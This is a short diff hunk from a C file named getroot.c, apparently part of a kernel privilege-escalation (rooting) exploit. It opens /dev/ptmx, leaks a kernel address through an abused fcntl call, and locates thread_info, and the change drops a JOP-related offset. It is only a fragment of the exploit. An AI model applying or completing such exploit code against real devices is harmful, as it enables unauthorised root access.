@@ -350,7 +350,7 @@ int getroot(struct offsets* o)
 	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
 		return 1;
 
-	fp = fcntl(dev, F_SETFL, MMAP_START) - 0x78;//0x78 -> see JOP in getroot.c
+	fp = fcntl(dev, F_SETFL, MMAP_START);
 	fp += KERNEL_START;
 	ti = get_thread_info(fp);
 
